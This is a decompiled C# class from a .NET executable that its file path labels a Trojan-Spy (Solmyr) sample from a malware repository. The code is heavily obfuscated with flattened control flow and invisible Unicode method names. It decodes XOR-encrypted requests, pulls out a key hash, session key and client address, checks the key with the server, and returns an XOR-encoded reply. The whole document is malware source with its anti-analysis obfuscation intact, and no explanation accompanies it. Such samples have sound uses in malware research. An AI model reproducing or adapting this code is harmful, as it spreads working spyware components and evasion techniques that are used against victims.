// Decompiled with JetBrains decompiler
// Type: DictionaryEntry.ZoneIdentityPermissionAttribute
// Assembly: HStringMarshaler, Version=48.18.3.2, Culture=neutral, PublicKeyToken=null
// MVID: C9C3DCB9-2BA4-424F-9339-2594708EFA64
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Solmyr.gen-61b469d1f7dd980add5fef67a976c5ede46680ae91ab253e216d5e99d2b91992.exe

using InternalMessageWrapper;
using MemberFilter;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NumberListCodes;
using OffsetAndRule;
using System.Net;
using System.Runtime.InteropServices;

namespace DictionaryEntry
{
  public class ZoneIdentityPermissionAttribute : EnumerableToIterableAdapter
  {
    private string keyhash;
    private string skey;
    private string clientAddress;

    public ZoneIdentityPermissionAttribute(TraceLoggingDataType server, IPEndPoint remoteIPEP)
      : base(server, remoteIPEP)
    {
      this.keyhash = string.Empty;
      this.skey = string.Empty;
      this.clientAddress = string.Empty;
    }

    public override void ManageData()
    {
label_1:
      int num1 = -1756748039;
      string[] strArray;
      bool flag1;
      bool flag2;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1166176483)) % 16U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1943465626 ^ -805011735;
            continue;
          case 2:
            goto label_3;
          case 3:
            flag1 = ZoneIdentityPermissionAttribute.\u206E‏‪‪‭⁫⁫‌‌‬⁪‭⁪⁬‎⁪⁭‎‫‍‏‫‌‍‏‎‭‭​‭⁪⁪⁫⁬‮⁮‫⁬‌‍‮(strArray[8]) < 32;
            num1 = -796799302;
            continue;
          case 4:
            str = this.GetString(this.XorBytes(this.data, this.GetBytes(ParsingInfo.\u200D⁭⁪⁭‌⁬⁬​‪‏⁯⁮⁭‎‭⁯‎⁫‎⁭‫‎‏⁪⁯‬‎‬‌‬‭​​⁬‎‍⁯⁯‭‬‮<string>(1578947788U))));
            num1 = (int) num2 * -2020120407 ^ 738373024;
            continue;
          case 5:
            Buffer.Log(ZoneIdentityPermissionAttribute.\u202D‮‍‪‌⁪‭‭‎‫‫‪⁫⁫‫⁫​‎‍‏‍⁭‪‬⁯‌​‏‫‍‫‫⁭⁯‍‬‏‫‪⁭‮(ParsingInfo.\u202A‭⁬‬‪‌⁯‬‬‭⁮⁪‪‏⁪⁬‪​‪‬⁯‌⁭‬⁫​⁬⁪‏‭‏‎‏⁮⁬‌⁫‬‍⁬‮<string>(1043565206U), this.keyhash, ParsingInfo.\u206F‬⁪‍⁯⁮​‪‮‭‬⁪‮⁪⁬‍⁯‎‭‎⁬‌‬‌⁬‏⁬‬‮‏‮⁪⁭‍‬⁪‫‫⁫‬‮<string>(4060323860U), ZoneIdentityPermissionAttribute.\u202A‎‫‫‮‌‌‪‌‌⁯‏‪⁫⁮‪‮‎⁮⁮​⁫‭‫⁪‬‏‏‫‬‭⁭‪‎‪⁭⁮⁫‭⁪‮(this.RemoteIPEP)), (byte) 1);
            num1 = (int) num2 * 1851525801 ^ -1162917876;
            continue;
          case 6:
            int num3 = !flag2 ? -1361452410 : (num3 = -50340454);
            num1 = num3 ^ (int) num2 * -71074908;
            continue;
          case 7:
            int num4 = !flag1 ? -895596 : (num4 = -632068142);
            num1 = num4 ^ (int) num2 * 1776142183;
            continue;
          case 8:
            int num5;
            num1 = num5 = ZoneIdentityPermissionAttribute.\u200B‍‬⁭⁫‪⁪⁫‭⁮​‮‫⁪⁯⁮‮‎‌⁮‍⁮‌‏​⁪‏‮‬​‭​‪⁯⁯⁮‌⁮⁬⁫‮(strArray[1], ParsingInfo.\u200D⁭⁪⁭‌⁬⁬​‪‏⁯⁮⁭‎‭⁯‎⁫‎⁭‫‎‏⁪⁯‬‎‬‌‬‭​​⁬‎‍⁯⁯‭‬‮<string>(671538477U), false) != 0 ? -2021311556 : (num5 = -1159725808);
            continue;
          case 9:
            strArray = ZoneIdentityPermissionAttribute.\u202D‭‏‌‭⁫‌⁪⁬⁫⁫​⁭⁮‪‎⁪‫‪‭⁫⁭⁬‫⁮‏⁮⁮‫⁪‎‏‏‏‫⁯‌‌⁮⁪‮(str, ParsingInfo.\u206E​⁬⁪‪⁬⁯‭‮‌⁯​‮‏⁯‭⁬⁪‪‬⁫‬⁪⁫​‭⁮‌⁪‌‭⁮‍​​⁬‪⁬‎‏‮<string>(4089425562U), -1, CompareMethod.Binary);
            num1 = (int) num2 * -1834512967 ^ -652436154;
            continue;
          case 10:
            flag2 = strArray.Length != 13;
            num1 = (int) num2 * -878340336 ^ 1976710315;
            continue;
          case 11:
            this.skey = strArray[12];
            this.clientAddress = strArray[10];
            num1 = (int) num2 * 822728845 ^ -244527465;
            continue;
          case 12:
            num1 = (int) num2 * -1557083201 ^ 1861658459;
            continue;
          case 13:
            this.keyhash = ZoneIdentityPermissionAttribute.\u202B⁭​‫‫‪‏⁬‏‌‫‮‍‬‮‍⁭⁫⁪‍‫‭⁬‎⁬‍‮‫‬‮‮‍‪‮⁭‫⁪‍‎‬‮(strArray[8], 1, 32);
            num1 = -1434373402;
            continue;
          case 14:
            num1 = (int) num2 * -911651398 ^ -1799832765;
            continue;
          case 15:
            num1 = (int) num2 * 402098680 ^ 1150260935;
            continue;
          default:
            goto label_18;
        }
      }
label_3:
      return;
label_18:;
    }

    public override byte[] CompileResponse()
    {
      if (!this.Server.Server.checkKey(this.keyhash, this.clientAddress))
        goto label_9;
label_1:
      int num1 = 5421673;
label_2:
      string str;
      byte[] numArray1;
      byte[] numArray2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1538949695)) % 11U)
        {
          case 0:
            num1 = (int) num2 * 303793817 ^ 1535391529;
            continue;
          case 1:
            num1 = (int) num2 * -1501256168 ^ -60955116;
            continue;
          case 2:
            goto label_1;
          case 3:
            str = ZoneIdentityPermissionAttribute.\u202D‮‍‪‌⁪‭‭‎‫‫‪⁫⁫‫⁫​‎‍‏‍⁭‪‬⁯‌​‏‫‍‫‫⁭⁯‍‬‏‫‪⁭‮(ParsingInfo.\u200C⁭⁪‌⁮‮‏‏⁬⁮​‭‬‎‏‪⁭‭‭⁫⁯⁬‏⁫⁭‎‏​‍⁮‎⁫‮‌‍‮⁯⁯⁪⁬‮<string>(3498445392U), this.keyhash, ParsingInfo.\u200C⁭⁪‌⁮‮‏‏⁬⁮​‭‬‎‏‪⁭‭‭⁫⁯⁬‏⁫⁭‎‏​‍⁮‎⁫‮‌‍‮⁯⁯⁪⁬‮<string>(1083705156U), this.skey);
            num1 = (int) num2 * 737824991 ^ 390435908;
            continue;
          case 5:
            Buffer.Log(ZoneIdentityPermissionAttribute.\u206C‌⁮‮⁫​‌⁮‮⁪‭⁪‍⁫⁫⁬‬⁭⁫‫‍⁪‬⁬‏‏‎‮⁪‍⁫⁬‌​​‏⁫​⁪‌‮(ParsingInfo.\u200C⁭⁪‌⁮‮‏‏⁬⁮​‭‬‎‏‪⁭‭‭⁫⁯⁬‏⁫⁭‎‏​‍⁮‎⁫‮‌‍‮⁯⁯⁪⁬‮<string>(1286505333U), this.keyhash, ParsingInfo.\u200C⁭⁪‌⁮‮‏‏⁬⁮​‭‬‎‏‪⁭‭‭⁫⁯⁬‏⁫⁭‎‏​‍⁮‎⁫‮‌‍‮⁯⁯⁪⁬‮<string>(3129008617U)), (byte) 1);
            num1 = (int) num2 * -2006936862 ^ 1743410239;
            continue;
          case 6:
            goto label_9;
          case 7:
            num1 = (int) num2 * -860337176 ^ 634207252;
            continue;
          case 8:
            num1 = (int) num2 * 772318166 ^ 2005298468;
            continue;
          case 9:
            numArray2 = numArray1;
            num1 = (int) num2 * -1083959700 ^ 467884418;
            continue;
          case 10:
            numArray1 = this.XorBytes(this.GetBytes(str), this.GetBytes(ParsingInfo.\u200D⁭⁪⁭‌⁬⁬​‪‏⁯⁮⁭‎‭⁯‎⁫‎⁭‫‎‏⁪⁯‬‎‬‌‬‭​​⁬‎‍⁯⁯‭‬‮<string>(1578947788U)));
            num1 = 744806745;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return numArray2;
label_9:
      str = ZoneIdentityPermissionAttribute.\u200C⁬⁭⁭‪‫⁯‮⁫‪⁯‍‭‏‎‭‏​‌‮‍‮‏⁫‌‌​​‎‪⁫‬⁪⁪‬‬‭‫‌⁯‮(new string[5]
      {
        ParsingInfo.\u206E​⁬⁪‪⁬⁯‭‮‌⁯​‮‏⁯‭⁬⁪‪‬⁫‬⁪⁫​‭⁮‌⁪‌‭⁮‍​​⁬‪⁬‎‏‮<string>(1143674824U),
        this.keyhash,
        ParsingInfo.\u200D⁭⁪⁭‌⁬⁬​‪‏⁯⁮⁭‎‭⁯‎⁫‎⁭‫‎‏⁪⁯‬‎‬‌‬‭​​⁬‎‍⁯⁯‭‬‮<string>(1699876586U),
        this.skey,
        ParsingInfo.\u200D⁭⁪⁭‌⁬⁬​‪‏⁯⁮⁭‎‭⁯‎⁫‎⁭‫‎‏⁪⁯‬‎‬‌‬‭​​⁬‎‍⁯⁯‭‬‮<string>(3696088405U)
      });
      Buffer.Log(ZoneIdentityPermissionAttribute.\u206C‌⁮‮⁫​‌⁮‮⁪‭⁪‍⁫⁫⁬‬⁭⁫‫‍⁪‬⁬‏‏‎‮⁪‍⁫⁬‌​​‏⁫​⁪‌‮(ParsingInfo.\u206F‬⁪‍⁯⁮​‪‮‭‬⁪‮⁪⁬‍⁯‎‭‎⁬‌‬‌⁬‏⁬‬‮‏‮⁪⁭‍‬⁪‫‫⁫‬‮<string>(2161810711U), this.keyhash, ParsingInfo.\u200D⁭⁪⁭‌⁬⁬​‪‏⁯⁮⁭‎‭⁯‎⁫‎⁭‫‎‏⁪⁯‬‎‬‌‬‭​​⁬‎‍⁯⁯‭‬‮<string>(3574716281U)), (byte) 1);
      num1 = 1322913033;
      goto label_2;
    }

    private byte[] XorBytes(byte[] data, byte[] key)
    {
label_1:
      int num1 = -1157066496;
      int index;
      int num2;
      byte[] numArray;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ -1705896761)) % 9U)
        {
          case 0:
            data[index] = (byte) ((int) data[index] ^ (int) key[index % key.Length]);
            num1 = -575032999;
            continue;
          case 1:
            int num4;
            num1 = num4 = index > num2 ? -1696630250 : (num4 = -840553263);
            continue;
          case 2:
            index = 0;
            num1 = (int) num3 * 449982012 ^ 2043743854;
            continue;
          case 3:
            num1 = (int) num3 * 1718698815 ^ 348282698;
            continue;
          case 5:
            checked { ++index; }
            num1 = (int) num3 * -534781217 ^ 1400118788;
            continue;
          case 6:
            goto label_1;
          case 7:
            numArray = data;
            num1 = (int) num3 * 119559066 ^ 353554326;
            continue;
          case 8:
            num2 = checked (data.Length - 1);
            num1 = (int) num3 * -525657397 ^ -353433180;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return numArray;
    }

    static string[] \u202D‭‏‌‭⁫‌⁪⁬⁫⁫​⁭⁮‪‎⁪‫‪‭⁫⁭⁬‫⁮‏⁮⁮‫⁪‎‏‏‏‫⁯‌‌⁮⁪‮(
      [In] string obj0,
      [In] string obj1,
      [In] int obj2,
      [In] CompareMethod obj3)
    {
      return Strings.Split(obj0, obj1, obj2, obj3);
    }

    static int \u206E‏‪‪‭⁫⁫‌‌‬⁪‭⁪⁬‎⁪⁭‎‫‍‏‫‌‍‏‎‭‭​‭⁪⁪⁫⁬‮⁮‫⁬‌‍‮([In] string obj0) => obj0.Length;

    static int \u200B‍‬⁭⁫‪⁪⁫‭⁮​‮‫⁪⁯⁮‮‎‌⁮‍⁮‌‏​⁪‏‮‬​‭​‪⁯⁯⁮‌⁮⁬⁫‮([In] string obj0, [In] string obj1, [In] bool obj2) => Operators.CompareString(obj0, obj1, obj2);

    static string \u202B⁭​‫‫‪‏⁬‏‌‫‮‍‬‮‍⁭⁫⁪‍‫‭⁬‎⁬‍‮‫‬‮‮‍‪‮⁭‫⁪‍‎‬‮([In] string obj0, [In] int obj1, [In] int obj2) => Strings.Mid(obj0, obj1, obj2);

    static string \u202A‎‫‫‮‌‌‪‌‌⁯‏‪⁫⁮‪‮‎⁮⁮​⁫‭‫⁪‬‏‏‫‬‭⁭‪‎‪⁭⁮⁫‭⁪‮([In] IPEndPoint obj0) => obj0.ToString();

    static string \u202D‮‍‪‌⁪‭‭‎‫‫‪⁫⁫‫⁫​‎‍‏‍⁭‪‬⁯‌​‏‫‍‫‫⁭⁯‍‬‏‫‪⁭‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2,
      [In] string obj3)
    {
      return obj0 + obj1 + obj2 + obj3;
    }

    static string \u206C‌⁮‮⁫​‌⁮‮⁪‭⁪‍⁫⁫⁬‬⁭⁫‫‍⁪‬⁬‏‏‎‮⁪‍⁫⁬‌​​‏⁫​⁪‌‮(
      [In] string obj0,
      [In] string obj1,
      [In] string obj2)
    {
      return obj0 + obj1 + obj2;
    }

    static string \u200C⁬⁭⁭‪‫⁯‮⁫‪⁯‍‭‏‎‭‏​‌‮‍‮‏⁫‌‌​​‎‪⁫‬⁪⁪‬‬‭‫‌⁯‮([In] string[] obj0) => string.Concat(obj0);
  }
}
